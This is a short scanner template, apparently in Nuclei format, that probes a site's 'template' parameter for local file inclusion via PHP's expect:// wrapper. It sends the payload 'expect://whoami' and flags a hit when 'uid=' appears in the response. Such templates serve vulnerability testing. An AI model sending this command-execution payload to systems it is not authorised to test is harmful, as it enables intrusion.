id: lfi5-005
name: 'Wrapper expect via template'
severity: high
type: active
tags:
  - lfi
  - traversal
  - wrapper
description: 'Reads file via expect wrapper'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      template:
        - 'expect://whoami'
    matchers:
      - type: word
        part: body
        words:
          - 'uid='
